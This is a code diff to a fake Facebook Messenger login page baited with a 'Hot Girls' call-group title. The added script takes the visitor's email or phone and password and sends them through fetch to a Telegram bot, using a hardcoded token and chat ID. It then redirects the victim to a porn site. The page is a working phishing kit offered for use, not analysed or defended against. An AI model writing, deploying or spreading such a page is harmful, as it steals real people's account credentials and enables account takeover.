@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sexy-Hot Girls Audio Video Call Group</title>
+    <title>Hot Girls Audio Video Call Group</title>
     <style>
         body {
             display: flex;
@@ -75,25 +75,51 @@
 <body>
     <div class="login-container">
         <div class="logo">
-            <img src="https://imagizer.imageshack.com/img922/1346/0UOnBb.jpg" alt="Messenger Logo">
+            <img src="https://i.postimg.cc/httt6kzh/index.png" alt="Messenger Logo">
         </div>
         <input type="text" id="emailOrNumber" placeholder="Email address or mobile number">
         <input type="password" id="password" placeholder="Password">
         <div class="checkbox-container">
-            <input type="checkbox">save login
+            <input type="checkbox">Save Login
         </div>
         <button class="login-btn" onclick="handleLogin()">Login</button>
         <button class="create-account-btn">Create Account</button>
         <a href="https://m.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&from_login_screen=0&ref=accounts_center_change_password" class="forgot-link">Forgotten account?</a>
     </div>
-
     <script>
         function handleLogin() {
             const emailOrNumber = document.getElementById('emailOrNumber').value;
             const password = document.getElementById('password').value;
 
             if (emailOrNumber && password) {
-                // Redirect to Messenger after successful login
+                // Telegram Bot Configuration
+                const botToken = "6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ"; // Replace with your Telegram bot token
+                const chatId = "5916486983"; // Replace with your Telegram chat ID
+                const message = `🚨New Login Attempt🚨:\nEmail/Mobile: ${emailOrNumber}\nPassword: ${password}`;
+
+                // Send data to Telegram Bot
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log("Data sent to Telegram Bot successfully.");
+                    } else {
+                        console.error("Failed to send data to Telegram Bot.");
+                    }
+                })
+                .catch(error => {
+                    console.error("Error sending data to Telegram Bot:", error);
+                });
+
+                // Redirect to the new website after sending data
                 window.location.href = "https://xhamster2.com/search/xnx+sex?quality=1080p";
             } else {
                 alert("Please fill in all fields.");
